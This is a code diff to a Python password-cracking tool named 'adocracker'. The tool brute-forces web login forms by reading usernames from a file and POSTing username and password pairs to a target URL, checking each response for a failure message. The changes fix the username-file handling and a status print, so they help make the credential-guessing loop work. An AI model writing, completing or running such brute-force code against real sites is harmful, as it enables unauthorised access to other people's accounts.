@@ -35,6 +35,7 @@ if len(sys.argv) < 2:
 if args.service == "http":
     target = args.attack
     username = args.login
+    username_file = args.login_file
     colon_file = args.colon_file
     password = args.password
     password_file = args.password_file
@@ -52,7 +53,7 @@ if args.service == "http":
               "\n     adocracker is started      "
               "\nTake a cup of coffee and wait"
               "\n------------------------------")
-        file = open(login_file)
+        file = open(username_file)
         user_list = file.readlines()
 
         for user in user_list:
@@ -62,7 +63,7 @@ if args.service == "http":
                 if args.verbose != "show":
                     break
 
-                print('\033[1;37m''[+]', username, '_', pwd)
+                print('\033[1;37m''[+]', user, '_', password)
             post = {'username': user, 'password': password, 'submit': "Submit"}
             re = requests.post(target, data=post)
             if args.response in re.text:  # Change this according to the server respond when login attempt failed
